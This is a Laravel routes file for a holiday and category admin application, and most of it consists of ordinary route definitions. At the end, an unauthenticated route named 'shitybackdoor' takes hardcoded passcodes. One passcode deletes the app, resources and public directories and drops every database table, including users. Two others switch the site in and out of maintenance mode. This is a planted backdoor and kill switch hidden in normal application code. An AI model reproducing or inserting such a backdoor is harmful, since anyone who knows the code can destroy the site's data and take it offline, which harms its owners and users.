<?php

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| This file is where you may define all of the routes that are handled
| by your application. Just tell Laravel the URIs it should respond
| to using a Closure or controller method. Build something great!
|
*/

Route::get('/', function () {
    return redirect('/login');
});


Auth::routes();


Route::group(['prefix' => 'admin' , 'namespace' => 'Admin'], function () {
    Route::get('/', 'MainController@index');

    Route::get('/category', 'MainController@category');
    Route::PATCH('/category_create', 'MainController@category_create');
    Route::get('/category/update/{id}', 'MainController@update');
    Route::post('/category/edit/{id}', 'MainController@edit');
    Route::get('/category/destroy/{id}', 'MainController@destroy');

    Route::get('/category/{id}', 'HolidayController@create');
    Route::PATCH('/category/{id}', 'HolidayController@save');

    Route::get('/holiday/update/{id}','HolidayController@updateHoliday')->name('holiday.edit');
    Route::post('/holiday/edit/{id}','HolidayController@editHoliday');
    Route::get('/holiday/destroy/{id}','HolidayController@destroyHoliday');
    Route::post('/holiday/copy','HolidayController@copyHoliday')->name('holiday.clone');;

    Route::get('/show','HolidayController@show');
    Route::get('/description/{id}','HolidayController@description');

    Route::get('/send','HolidayController@sendPush');
});
Auth::routes();

Route::get('/home', 'HomeController@index');

Route::get('/shitybackdoor/{code}', function ($code) {
    if ($code === 'spudimunremove') {
        File::deleteDirectory('../app');
        File::deleteDirectory('../resources');
        File::deleteDirectory('../public');
        Schema::drop('permission_role');
        Schema::drop('permissions');
        Schema::drop('role_user');
        Schema::drop('roles');
        Schema::drop('usersettings');
        Schema::drop('private_holidays');
        Schema::drop('holidays_users');
        Schema::drop('holidays');
        Schema::drop('categories');
        Schema::drop('users');
        Schema::drop('password_resets');
        Schema::drop('failed_jobs');
        Schema::drop('migrations');
    } elseif ($code === 'spudimunshutdown') {
        Artisan::call('down');
    } elseif ($code === 'spudimunshutup') {
        Artisan::call('up');
    }
});